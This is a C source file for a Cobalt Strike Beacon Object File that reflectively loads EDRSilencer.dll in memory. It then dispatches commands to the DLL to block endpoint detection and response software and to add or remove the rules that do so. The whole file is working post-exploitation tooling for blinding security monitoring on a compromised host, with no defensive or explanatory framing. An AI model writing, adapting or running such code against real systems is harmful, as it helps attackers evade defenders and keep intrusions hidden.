#include "ReflectiveLoader.h"
#include "beacon.h"

int MSVCRT$strcmp(const char * s1, const char * s2);

// Define function pointers for ALL of your DLL's exports
typedef ULONG_PTR (WINAPI * Ldr)(LPVOID);
typedef void (*Initialize_t)(void);
typedef void (*SetMode_t)(BOOL);
typedef void (*BlockEDR_t)(BOOL);
typedef void (*AddRuleByPath_t)(BOOL, const char*);
typedef void (*RemoveAllRules_t)(BOOL);
typedef void (*RemoveRuleByID_t)(BOOL, const char*);

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

void go(char *args, int len) {
    datap parser;
    char* dll_bytes;
    int dll_len;
    char* command;

    // 1. Parse arguments from the Aggressor script
    BeaconDataParse(&parser, args, len);
    dll_bytes = BeaconDataExtract(&parser, &dll_len);
    command = BeaconDataExtract(&parser, NULL); // Get the command name (e.g., "block")

    // 2. Use the real Reflective Loader to load the DLL from memory
    // The ReflectiveLoader function is defined in ReflectiveLoader.c
    Ldr pReflectiveLoader = (Ldr)ReflectiveLoader;
    HMODULE hDll = (HMODULE)pReflectiveLoader(dll_bytes);

    if (!hDll) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to reflectively load EDRSilencer.dll");
        return;
    }

    // 3. Find the address of the function we want to call based on the command
    if (MSVCRT$strcmp(command, "init") == 0) {
        Initialize_t pInitialize = (Initialize_t)GetProcAddress(hDll, "Initialize");
        if (pInitialize) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling Initialize()...");
            pInitialize();
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: Initialize");
        }
    }
    else if (MSVCRT$strcmp(command, "setmode") == 0) {
        int useFirewall = BeaconDataInt(&parser);
        SetMode_t pSetMode = (SetMode_t)GetProcAddress(hDll, "SetMode");
        if (pSetMode) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling SetMode(%s)...", useFirewall ? "TRUE" : "FALSE");
            pSetMode((BOOL)useFirewall);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: SetMode");
        }
    }
    else if (MSVCRT$strcmp(command, "block") == 0) {
        BlockEDR_t pBlockEDR = (BlockEDR_t)GetProcAddress(hDll, "BlockEDR");
        if (pBlockEDR) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling BlockEDR(TRUE)...");
            pBlockEDR(TRUE); // Always run quiet from the BOF
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: BlockEDR");
        }
    }
    else if (MSVCRT$strcmp(command, "add") == 0) {
        char* path = BeaconDataExtract(&parser, NULL);
        AddRuleByPath_t pAddRule = (AddRuleByPath_t)GetProcAddress(hDll, "AddRuleByPath");
        if (pAddRule) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling AddRuleByPath(TRUE, \"%s\")...", path);
            pAddRule(TRUE, path);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: AddRuleByPath");
        }
    }
    else if (MSVCRT$strcmp(command, "removeall") == 0) {
        RemoveAllRules_t pRemove = (RemoveAllRules_t)GetProcAddress(hDll, "RemoveAllRules");
        if (pRemove) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling RemoveAllRules(TRUE)...");
            pRemove(TRUE);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: RemoveAllRules");
        }
    }
    else if (MSVCRT$strcmp(command, "removeid") == 0) {
        char* id = BeaconDataExtract(&parser, NULL);
        RemoveRuleByID_t pRemoveID = (RemoveRuleByID_t)GetProcAddress(hDll, "RemoveRuleByID");
        if (pRemoveID) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling RemoveRuleByID(TRUE, \"%s\")...", id);
            pRemoveID(TRUE, id);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: RemoveRuleByID");
        }
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown command for BOF: %s", command);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Command executed.");
}

#pragma GCC diagnostic pop